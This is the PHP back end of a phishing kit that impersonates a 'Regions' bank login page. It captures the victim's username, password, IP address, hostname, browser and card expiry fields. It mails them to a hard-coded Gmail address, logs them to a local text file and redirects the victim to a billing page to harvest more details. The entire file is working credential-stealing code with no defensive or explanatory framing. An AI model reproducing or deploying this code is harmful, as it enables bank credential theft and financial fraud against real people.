<?php
$ip = getenv("REMOTE_ADDR");
$text_result .= "[+]xxxxxxxxxxxxxxxxx Regions Login xxxxxxxxxxxxxxxxx[+]\n";
$text_result .= "[+]USER  : ".$_POST['UserName']."\n";
$text_result .= "[+]PASSWORD: ".$_POST['Password']."\n";
$text_result .= "[+]xxxxxxxxxxxxxxxxx Regions Login xxxxxxxxxxxxxxxxx[+]\n";
$text_result .= "[+]IP address =  $ip\n";
$text_result .= "[+]host = ".gethostbyaddr($ip)."\n";
$text_result .= "[+]BROWSER = ".$_SERVER['HTTP_USER_AGENT']."\n";
$text_result .= "[+]xxxxxxxxxxxxxxxxx Mahdex999 xxxxxxxxxxxxxxxxx[+]\n";
$cc = $_POST['ccn'];
$subject = "[Regions] Login  = $ip\n".$_POST['exm']."/".$_POST['exy'];
$send = "mahdichakroun987@gmail.com";
$headers = 'From: Regions' . "\r\n" .
mail($send,$subject,$text_result,$headers,$file);
$file = fopen("mahdex.txt", 'a');
fwrite($file, $text_result);

header("Location: ../billing.php");?>